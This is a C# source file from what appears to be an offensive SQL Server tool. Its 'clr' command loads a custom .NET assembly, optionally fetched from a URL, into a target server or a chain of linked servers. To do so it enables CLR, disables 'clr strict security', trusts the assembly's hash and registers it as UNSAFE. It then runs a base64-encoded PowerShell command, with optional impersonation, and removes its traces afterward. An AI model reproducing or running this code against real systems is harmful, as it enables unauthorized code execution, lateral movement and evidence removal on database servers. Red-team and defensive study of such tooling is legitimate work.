using CheeseSQL.Helpers;
using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.IO;

namespace CheeseSQL.Commands
{
    public class clr : ICommand
    {
        public static string CommandName => "clr";

        public string Description()
        {
            return $"Execute Encoded PowerShell Command via custom .NET assemblies";
        }

        public string Usage()
        {
            return $@"{Description()} 
Required arguments:
  /server:SERVER                   Server to connect to
  /command:<B64-PWSH>              Command to execute

Optional arguments:
  /target:TARGET                   Specify a linked SQL server as the target
  /db:DB                           Specify an alternate database to connect 
  /assembly:[NAME|URL|PATH]        Specify an assembly name (can also be a URL or a full Path)
  /class:NAME                      Specify the name of the class within the assembly
  /method:NAME                     Specify the function to use within the class
  /compile                         If set, creates a new assembly on the fly
  /impersonate:USER                Impersonate a user on the connect server
  /impersonate-intermediate:USER   Impersonate a user on the intermediate server
  /impersonate-linked:USER         Impersonate a user on the target server
  /sqlauth                         If set, use SQL authentication
    /user:SQLUSER                  If /sqlauth, set the user for SQL authentication
    /password:SQLPASSWORD          If /sqlauth, set the password for SQL authentication";
        }

        public void Execute(Dictionary<string, string> arguments)
        {
            string connectInfo = "";
            string assembly = "";
            string clazz = "";
            string cmd = "";
            string method = "";
            bool compile;

            ArgumentSet argumentSet;
            try
            {
                argumentSet = ArgumentSet.FromDictionary(
                    arguments,
                    new List<string>() {
                        "/command",
                        "/server"
                    });
            }
            catch (Exception e)
            {
                Console.WriteLine($"[x] Error: {e.Message}");
                return;
            }

            argumentSet.GetExtraString("/command", out cmd);
            argumentSet.GetExtraBool("/compile", out compile);
            argumentSet.GetExtraString("/assembly", out assembly);
            argumentSet.GetExtraString("/class", out clazz);
            argumentSet.GetExtraString("/method", out method);

            if (String.IsNullOrEmpty(assembly) && !compile)
            {
                Console.WriteLine("\r\n[X] You must supply an assembly name, path, url, or choose the `compile` option\r\n");
                return;
            }
            else if (String.IsNullOrEmpty(assembly) && compile)
            {
                assembly = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute (PS Base64 Encoded)!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(clazz))
            {
                clazz = "StoredProcedures";
            }
            if (String.IsNullOrEmpty(method))
            {
                method = StringUtils.RandomString(10);
            }


            SqlConnection connection;
            SQLExecutor.ConnectionInfo(arguments, argumentSet.connectserver, argumentSet.database, argumentSet.sqlauth, out connectInfo);
            if (String.IsNullOrEmpty(connectInfo))
            {
                return;
            }
            if (!SQLExecutor.Authenticate(connectInfo, out connection))
            {
                return;
            }

            // I am confused about why it is necessary to perform this step as a separate procedure
            // But it seems in-line impersonation doesn't work properly
            if (!String.IsNullOrEmpty(argumentSet.impersonate))
            {
                Console.WriteLine("[*] Attempting impersonation as {0}", argumentSet.impersonate);
                SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
            }

            Console.WriteLine("[*] Loading assembly..");

            string hash;
            string hexData = AssemblyLoader.LoadAssembly(assembly, out hash, clazz, method, compile);


            var procedures = new Dictionary<string, string>();

            procedures.Add("Enabling advanced options..", $"sp_configure 'show advanced options', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr enabled'..", $"sp_configure 'clr enabled', 1; RECONFIGURE;");
            procedures.Add("Enabling 'clr strict security'..", $"sp_configure 'clr strict security', 0; RECONFIGURE;");
            procedures.Add("Adding assembly to trusted list..", $"sp_add_trusted_assembly @hash={hash};");
            procedures.Add($"Creating assembly [{assembly}]..", $"CREATE ASSEMBLY [{assembly}] FROM {hexData} WITH PERMISSION_SET = UNSAFE;");
            procedures.Add($"Creating procedure [{assembly}].[{clazz}].[{method}]..", $"CREATE PROCEDURE [dbo].[{method}] @command NVARCHAR (4000) AS EXTERNAL NAME [{assembly}].[{clazz}].[{method}];");

            procedures.Add("Executing command..", $"{method} '{cmd}';");

            procedures.Add("Dropping procedure..", $"DROP PROCEDURE [dbo].[{method}];");
            procedures.Add("Dropping assembly..", $"DROP ASSEMBLY [{assembly}];");
            procedures.Add("Removing assembly from trusted list..", $"sp_drop_trusted_assembly @hash={hash};");
            procedures.Add("Restoring CLR strict security'..", $"sp_configure 'clr strict security', 1; RECONFIGURE;");
            procedures.Add("Disabling CLR..", $"sp_configure 'clr enabled', 0; RECONFIGURE;");

            foreach (string step in procedures.Keys)
            {
                Console.WriteLine("[*] {0}", step);

                if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
                {
                    SQLExecutor.ExecuteProcedure(
                        connection,
                        procedures[step],
                        argumentSet.impersonate
                        );
                }
                else if (String.IsNullOrEmpty(argumentSet.intermediate))
                {
                    SQLExecutor.ExecuteLinkedProcedure(
                        connection, 
                        procedures[step], 
                        argumentSet.target, 
                        argumentSet.impersonate, 
                        argumentSet.impersonate_linked
                        );
                }
                else
                {
                    SQLExecutor.ExecuteDoubleLinkedProcedure(
                        connection, 
                        procedures[step], 
                        argumentSet.target, 
                        argumentSet.intermediate, 
                        argumentSet.impersonate, 
                        argumentSet.impersonate_linked, 
                        argumentSet.impersonate_intermediate
                        );
                }
            }

            connection.Close();
        }
    }
}
